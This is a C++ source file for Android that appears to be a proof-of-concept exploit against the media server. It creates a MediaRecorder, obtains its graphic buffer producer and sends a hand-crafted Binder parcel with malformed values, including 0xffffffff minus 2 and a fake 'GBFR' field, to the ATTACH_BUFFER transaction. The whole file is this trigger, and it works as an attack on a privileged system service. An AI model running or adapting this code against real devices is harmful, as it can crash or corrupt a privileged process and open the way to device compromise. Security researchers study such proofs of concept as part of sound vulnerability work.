#include <binder/Parcel.h>

#include <binder/ProcessState.h>

#include <binder/IServiceManager.h>

#include <soundtrigger/ISoundTriggerHwService.h>

#include <binder/TextOutput.h>
#include <media/IOMX.h>
#include <media/IAudioFlinger.h>
#include <media/ICrypto.h>
#include <system/sound_trigger.h>
#include <gui/ISurfaceComposer.h>
#include <media/IMediaPlayer.h>
#include <media/IMediaPlayerService.h>
#include <media/IMediaPlayerClient.h>
#include <gui/IGraphicBufferProducer.h>
#include <media/IMediaRecorder.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <fcntl.h>


using namespace android;


int main(__attribute__((unused)) int argc, __attribute__((unused)) char*
const argv[])

{

   sp<IServiceManager> sm = defaultServiceManager();
   sp<IBinder> MeidaPlayerService = sm->checkService(String16("media.player"));

   sp<IMediaPlayerService> iMPService = IMediaPlayerService::asInterface(MeidaPlayerService);
   printf("Get iMPService instance, 0x%08x\n", iMPService.get());
   sp<IMediaRecorder> recorder = iMPService->createMediaRecorder();
   printf("Get recorder instance, 0x%08x\n", recorder.get());
   const char *fileName = "/sdcard/test";
   int fd = open(fileName, O_RDWR | O_CREAT, 0744);
   recorder->setVideoSource(2);
   recorder->setOutputFile(fd, 0, 0);
   recorder->setOutputFormat(0);
   recorder->init();
   recorder->prepare();
   recorder->start();
   sp<IGraphicBufferProducer> iGBP = recorder->querySurfaceMediaSource();
   printf("Get iGBP instance, 0x%08x\n", iGBP.get());
   //iMPService->getOMX();
   bool needAbort = false;
   size_t x = 'GBFR';
   printf("x is %x\n", x);
   //for (int i = 0; i < 3000; ++i) {
       Parcel data, reply;
       status_t err;
       data.writeInterfaceToken(iGBP->getInterfaceDescriptor());
       data.writeInt32((0xffffffff - 2));
	   data.writeInt32(0);
   
	   data.writeInt32(x);
	   data.writeInt32(0);
	   data.writeInt32(0);
	   data.writeInt32(0);
	   data.writeInt32(0);
	   data.writeInt32(0);
	   data.writeInt32(0);
	   data.writeInt32(0);
	   
	   data.writeInt32(0);
	   data.writeInt32(1000);
       iGBP->asBinder()->transact(6, data, &reply); 
       printf("iGBP ATTACH_BUFFER aval is %d\n", reply.dataAvail());
       int slot = reply.readInt32();
       err = reply.readInt32();
       printf("iGBP ATTACH_BUFFER err is %d\n", err);

   //}
   
   printf("Read over\n");
   return 0;
}
